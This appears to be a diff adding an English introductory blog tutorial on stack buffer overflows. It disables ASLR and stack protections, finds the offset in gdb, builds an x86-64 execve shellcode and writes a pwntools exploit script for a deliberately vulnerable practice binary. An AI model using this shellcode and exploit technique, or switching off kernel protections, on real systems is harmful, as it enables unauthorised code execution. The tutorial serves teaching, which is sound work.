@@ -183,7 +183,7 @@ Share</a>
     
     
     <br/>
-    <i class="fas fa-clock"></i> 1 min read
+    <i class="fas fa-clock"></i> 10 min read
 </div>
 
 
@@ -192,7 +192,337 @@ Share</a>
   <div class="post">
     
 
-<h2 id="translation-coming-soon">Translation coming soon ! =]</h2>
+<blockquote>
+<p>Small edit after the initial publication of the articles:</p>
+
+<p>These four articles lead me to give an &ldquo;pwn introductory&rdquo; conference at the HitchHack 2018. It summarizes the first 3 articles but goes less into detail. If this format suits you better, the slides are downloadable<a href="/hacking/pwn_1of4_buffer_overflow/slides_conf_123_pwned.pdf">here</a> and the video (French only) here :</p>
+</blockquote>
+
+<p><a href="https://www.youtube.com/watch?v=hmt8M9YLwTg"><img src="http://img.youtube.com/vi/hmt8M9YLwTg/0.jpg" alt="1, 2, 3, PWNED !" /></a></p>
+
+<h2 id="printf-mr-ms-s-bonjour-lecteur">printf(&ldquo;Mr, Ms %s, bonjour. &ldquo;, lecteur);</h2>
+
+<p>Today, I want to offer you an article more sophisticated than usual, the first of  new kind, an article dealing with heavy stuff, in short, an article that blows ass!</p>
+
+<p><img class="img_med" src="/hacking/pwn_1of4_buffer_overflow/patrick.jpg" alt="patrick" ></p>
+
+<p>The concept discussed today is quite extensive, so I know that many of you, among my usual readers, will not necessarily be able to understand the entire article, which is why I will try to make it interesting even for neophytes. So if you are a sorcerer&rsquo;s apprentice, be relentless, enjoy it, otherwise, you wan see it as a black magic trick, it&rsquo;s beautiful, it&rsquo;s powerful, but you don&rsquo;t have to understand everything to appreciate it :)</p>
+
+<p>This article is therefore the first of a small series dedicated to buffers overflow!</p>
+
+<p>One last thing before we start&hellip;. <br />
+A big shout out to Cyril Bresch who gave me the right to use some of his exercises for this introduction BOF. But especially thanks to him for introducing me to binary exploitation (Well, ok you were paid, but still! :D). <br />
+His personal website is hosted here: <a href="https://cyrilbresch.fr/">https://cyrilbresch.fr/</a></p>
+
+<p>What comes next? Shellcodes, assembly, ret2libc, rop, and much more. None of these words mean anything to you? It&rsquo;s normal, don&rsquo;t worry, we&rsquo;ll start easy with some context.</p>
+
+<p>I will try a recursive definition: I start by defining the core of the subject, and every time a new term appears, I define it right after. This should, I hope, allow a fluid reading! :)</p>
+
+<h2 id="buffer-overflow-watizit">Buffer overflow, Watizit?</h2>
+
+<ul>
+<li>Buffer:</li>
+</ul>
+
+<p>Small recipient in which we store pieces of information in a program. Most of the time, this buffer will contain chars, or a sequence of numbers, or whatever, anyway, they are bits stuck together that form bytes. Buffers are usually stored on the heap or in the stack.</p>
+
+<ul>
+<li>Overflow :</li>
+</ul>
+
+<p>Action that consists in exceeding the initial size of a buffer, thus affecting the values stored after said buffer. We as hackers are happy when a lot of very useful data can be found after the buffer. The most convenient case being to control the instruction pointer (a register), which tells which piece of code should be executed next. Be able do modity it, and you&rsquo;re all done!
+There are many ways to perform an overflow, but also many protections in place.</p>
+
+<ul>
+<li>Program:</li>
+</ul>
+
+<p>&ldquo;Well, I know what a program is, you click on it and it starts, how lame!&rdquo;</p>
+
+<p>Sure&hellip; But no really. You got the core idea, but most programs work in a command line interface, i.e. they are run by typing commands into a shell. Unlike with windows, where most of the time it is the extension of the file (.txt, .exe, &hellip;) that determines its type, with linux, it is rarely used, we got much better. The window&rsquo;s way of doing so is itself a huge security flaw. More information about this kind of issue here: <a href="https://blog.malwarebytes.com/cybercrime/2014/01/the-rtlo-method/">article_RTLO</a></p>
+
+<p>What replaces this practice is the use of a magic number. It is a sequence of bytes that is put at the beginning of the file and which allows the system to know the type of file it is and version of it. Here, for an ELF, we see:</p>
+
+<p><img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/readelf.png" alt="readelf" ></p>
+
+<p>Two notable things here:<br />
+ - 45 4c 46 is the ELF&rsquo;s ASCII code: Executable and Linkable Format<br />
+ - Type of architecture to launch it: X86-64, so 64 bits.</p>
+
+<ul>
+<li>Architecture :</li>
+</ul>
+
+<p>There are many types of processors, and each processor has its own set of instructions. Although standards are adopted by manufacturers, each processor retains its own particularities. A non-exhaustive list is available here: <a href="https://en.wikipedia.org/wiki/List_of_instruction_sets">https://en.wikipedia.org/wiki/List_of_instruction_sets</a></p>
+
+<p>The most common architectures are: x86, x86-64, arm, mips,&hellip;</p>
+
+<p>x86 refers to the usual 32bits, and x86-64 to the 64 bits. This difference is due to the size of the registers used for addresses and operation management. A program x32 will work on both archs, but a x64 program will only work on a x64 machine.</p>
+
+<ul>
+<li>Linux :</li>
+</ul>
+
+<p>Linux is not Unix. If you&rsquo;re there, it&rsquo;s never too late! In short, a large family of open source OS.</p>
+
+<p><a href="https://openclassrooms.com/courses/reprenez-le-controle-a-l-aide-de-linux/mais-c-est-quoi-linux">Linux introduction</a></p>
+
+<ul>
+<li>Shell :</li>
+</ul>
+
+<p>A shell is a command interpreter. Seen from afar, this is where hooded people type green lines of code on a black terminal. They exist on all OSes because it is necessary to communicate with the system this way. Attention, for each system, there are several implementations and versions.</p>
+
+<p>Example (linux): sh / bash / dash / zsh / fish / &hellip;</p>
+
+<ul>
+<li>Stack:</li>
+</ul>
+
+<p>The stack is a place used by the processor to store data. It is a LastInFirstOut file. In other words, the last element to be pushed is the first to be popped.</p>
+
+<p><img class="img_med" src="/hacking/pwn_1of4_buffer_overflow/stack.png" alt="stack" ></p>
+
+<ul>
+<li>Heap :</li>
+</ul>
+
+<p>The heap also allows data to be stored, but in a more dynamic / flexible way. It is used (not exclusively) when the malloc functions (memory allocation during program execution) is called.</p>
+
+<ul>
+<li>Function:</li>
+</ul>
+
+<p>A series of assembly instructions starting (most of the time&hellip;) by booking space on the stack to process data locally, and ending with <code>leave</code> and <code>ret</code> to let the calling program resume at the initial calling state.</p>
+
+<ul>
+<li>Shellcode :</li>
+</ul>
+
+<p>A series of assembler instructions that spawns a shell.</p>
+
+<ul>
+<li>Bits :</li>
+</ul>
+
+<p>A data that is worth 0 or 1, atomic unit.</p>
+
+<ul>
+<li>Byte :</li>
+</ul>
+
+<p>A sequence of 8 bits, encoding an number between 0 and 255.</p>
+
+<p>Well, take a break, take a deep breath, make yourself comfy in your chair&hellip; <br />
+And we&rsquo;re going back!</p>
+
+<h2 id="disable-security">Disable security:</h2>
+
+<p>The first thing to do for a first approach is to disable the protections in place, because trying to learn this subject with all the protections currently used: RIP!</p>
+
+<p>We start by disabling the ASLR, it is a kernel parameter (kernel of the system, which manages almost everything) that indicates whether or not to place the different segments of a program at random addresses. Here, we will use the stack, so we don&rsquo;t want it to move at all.</p>
+
+<pre><code class="language-shell"># As root:
+echo 0 &gt; /proc/sys/kernel/randomize_va_space
+</code></pre>
+
+<p>We will then compile the program so that:</p>
+
+<ul>
+<li><p>There is no stack canary, in other words, no value placed at the end of the buffer, which is checked and screams if it has been overwritten (so if it detects a buffer overflow)</p></li>
+
+<li><p>The stack is executable, otherwise, an NX bit is placed there. This bit of information means that it is not possible to execute the data (here assembly instructions) found there. It is therefore impossible for us to execute the code of our choice.</p></li>
+
+<li><p>The Position Independent Code is disabled (do not place the different segments of our program in random places).</p></li>
+</ul>
+
+<p>We therefore use the following compilation line:</p>
+
+<pre><code class="language-shell">$ gcc -o vuln -fno-stack-protector -no-pie -z execstack vuln.c
+</code></pre>
+
+<p>We will also need a few tools:</p>
+
+<ul>
+<li><p>python: Language and interpreter, version 2 for less annoying encoding reasons</p></li>
+
+<li><p>gdb : Gnu debugger, useful to understand what&rsquo;s going on in the program</p></li>
+
+<li><p>gdb-peda: gdb improved with python scripting, makes gdb easier to use</p></li>
+
+<li><p>pwntool : Not much used here, this python tool makes it easier to perform binary exploits</p></li>
+</ul>
+
+<h2 id="recon">Recon</h2>
+
+<p>The studied binary is downloadable<a href="/hacking/pwn_1of4_buffer_overflow/vuln">here</a></p>
+
+<p>Okay, it needs an argument. What is done with it?</p>
+
+<p>Seems like, nothing&hellip; It&rsquo;s only a test program, we don&rsquo;t care! <code>¯\_(ツ)_/¯</code></p>
+
+<p><img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/recon.png" alt="recon" ></p>
+
+<p>Find the crash:</p>
+
+<p>The usual beginner strategy, long arguments.</p>
+
+<p><img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/crash.png" alt="crash" ></p>
+
+<p>Hey, that looks good!</p>
+
+<p>Let&rsquo;s just pass it a long argument in order to make it crash!</p>
+
+<p>Offset research:</p>
+
+<p><img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/pattern_create.png" alt="pattern_create" ></p>
+
+<p>Create the pattern (easily recognizable, that will be used to understand which registers are reachable by our input), then run the program with the pattern as parameter.</p>
+
+<p>We see here that the crash occurs on the <code>ret</code> instruction (code section, small arrow on the left).</p>
+
+<p><img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/pattern_run.png" alt="pattern_search" ></p>
+
+<p>After the crash, we search the pattern in the memory:</p>
+
+<p><img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/pattern_search.png" alt="pattern_search" ></p>
+
+<p>The memory analysis has found pieces of our pattern in different places, so we see that the RSP (Registre Stack Pointer) is 40 bytes away from our input start.</p>
+
+<p>But we already know that the crash occurs on a ret. Ret is an instruction that stores the last element of the stack in RIP (Instruction Pointer) to return to the main program in order to continue its execution. So controlling RSP before a ret means controlling  RIP. Controlling RIP means being able to divert the execution flow of or target, and&hellip;</p>
+
+<p>And it&rsquo;s a win-win! <code>^~^</code></p>
+
+<p>Shellcode search:</p>
+
+<p>We do know where we are going to inject. What we now need a shellcode, a good one, a real one! :D</p>
+
+<p>A quick tour on <a href="http://shell-storm.org/shellcode/">shellstorm</a> or <a href="https://www.exploit-db.com/">exploit-db</a>, choose the right architecture, &hellip;</p>
+
+<p>Here, the shellcode is homemade, because the general idea remains the same: Place the right parameters in the registers, then trigger a syscall so that the kernel executes what you want, here a shell.</p>
+
+<p>Shellcode :</p>
+
+<p><code>\x48\xB8\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xE8\x08\x50\x48\x89\xE7\x48\x31\xC0\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x0F\x05</code></p>
+
+<p>We&rsquo;re still going to disassemble it to understand what it does, thanks to this site: <a href="https://onlinedisassembler.com">https://onlinedisassembler.com</a></p>
+
+<p><img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/shellcode.png" alt="shellcode" ></p>
+
+<pre><code>0  : &quot;//bin/sh&quot; dans rax
+A  : &quot;/bin/sh\x00&quot; dans rax
+E  : push rax in the stack
+F  : rdi now points to the stack
+12 : 0 in rax
+15 : 59 in rax (execve)
+17 : 0 in rsi
+1a : 0 in rdx
+1d : Init the syscall
+</code></pre>
+
+<p>This will execute <code>/bin/sh</code> using the execve syscall.</p>
+
+<p>The parameters to use are found using this doc: <br />
+<a href="https://w3challs.com/syscalls/?arch=x86_64">https://w3challs.com/syscalls/?arch=x86_64</a></p>
+
+<h2 id="development-of-the-exploit">Development of the exploit</h2>
+
+<p>We want to put our shellcode in a known place, then reach a size of 40 bytes to place the address of the shellcode to execute. Yapluka!</p>
+
+<p>Our payload (data sent during the attack) will therefore have the following structure:<br />
+PADDING + SHELLCODE + SHELLCODE_ADDRESS</p>
+
+<p>To find out where the data entered by the user is located, in gdb:</p>
+
+<p>Disassemble the main (name convention for the main function of the program), define a breakpoint before the end of the execution, then run it with AAAA as a parameter.</p>
+
+<p><img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/disas_main.png" alt="disas_main" ></p>
+
+<p><img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/find.png" alt="find" ></p>
+
+<p>Once stopped, our input is in the stack, at the address: 0x7fffffffe570</p>
+
+<p>And our shellcode will be a little farther, because of the padding.</p>
+
+<p>Python code of the exploit:</p>
+
+<pre><code class="language-python">#!/usr/bin/env python2
+
+from pwn import *
+
+def save(what, where):
+  with open(where, &quot;wb&quot;) as f:
+    f.write(what)
+
+shellcode = &quot;\x48\xB8\x2F\x2F\x62\x69\x6E\x2F\x73\x68&quot;
+shellcode += &quot;\x48\xC1\xE8\x08\x50\x48\x89\xE7\x48\x31&quot;
+shellcode += &quot;\xC0\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x0F\x05&quot;
+
+offset = 40
+count_A = offset - len(shellcode)
+padding = &quot;A&quot; * count_A
+addr_input = 0x7fffffffe570 # Depends on your OS
+addr_shellcode = addr_input + count_A
+log.info(&quot;Shellcode at 0x{:8x}&quot;.format(addr_shellcode))
+
+payload = padding + shellcode + p64(addr_shellcode)
+
+save(payload, &quot;payload&quot;)
+log.success(&quot;Payload written&quot;)
+</code></pre>
+
+<p>To run the exploit, all you have to do is give its output to the program as an argument:</p>
+
+<p><img class="img_full" src="/hacking/pwn_1of4_buffer_overflow/run_exploit.png" alt="run_exploit" ></p>
+
+<p>And BIM! Spawned a shell! <code>\o/</code></p>
+
+<p><img class="img_small" src="/hacking/pwn_1of4_buffer_overflow/like_a_boss.png" alt="like_a_boss" ></p>
+
+<h2 id="notes-and-reflection">Notes and Reflection:</h2>
+
+<ul>
+<li>Note 1</li>
+</ul>
+
+<p>In this example, an error has been hidden, will you be able to find it?</p>
+
+<p><em>-[ SPOIL ]-</em></p>
+
+<p>This shellcode contains null-bytes (<code>\x00</code>, a sentinel which in C, refers to the end of a string) that are very poorly managed by bash. If the argument had been passed directly, bash would have cut it off. Going through a file allows you to send everything to the program, even null-bytes. But this does not solve the problem entirety. Indeed, the vulnerable function here is strcpy. It copies a string and stops at the first sentinel (i.e. null-byte, i.e. 0x00, i.e. ShellCodeBreakerOfDoom). Our exploit still works because they appear at the end or our payload as an address. And we paste this stack address on&hellip; A stack address, so the 0x00 are already present.</p>
+
+<p>Thinking: How to fix the shellcode so that it no longer uses null-byte?</p>
+
+<ul>
+<li>Note 2</li>
+</ul>
+
+<p>This example is limited because the size available before the EIP is very small. That&rsquo;s enough for spawning a shell, but not for much more. In addition, since this space is close to the addresses used, it may be altered during execution. It&rsquo;s annoying, isn&rsquo;t it?</p>
+
+<p>Reflection: How to use a shellcode of arbitrarily long size?</p>
+
+<ul>
+<li>Note 3</li>
+</ul>
+
+<p>This example only works if the ASLR is disabled because it is highly dependent on the stack. There are many ways to bypass the ASLR&hellip; More in the next articles&hellip; Pwn-knowledge, one drop at a time! :D</p>
+
+<p>Huh ? You read this far? Hatzoff, my friend!</p>
+
+<p>You&rsquo;re a magician now! Almost&hellip; ;)</p>
+
+<p><img class="img_small" src="/hacking/pwn_1of4_buffer_overflow/blair.png" alt="blair" ></p>
+
+<p>This being my first article on the subject, I know it will be incomplete, and full of inaccuracies if not errors. Feedback are welcome for typos, missing details, errors, &hellip; <code>^.^</code></p>
+
+<ul>
+<li>Hints</li>
+</ul>
+
+<p>-Use&hellip; Xor? Add? Sub? Other? <br />
+ -Environmental variables? Order of the padding and shellcode in out payload?</p>
+
+<p>I hope you appreciated this first step into the pwning world,</p>
 
   </div>
   
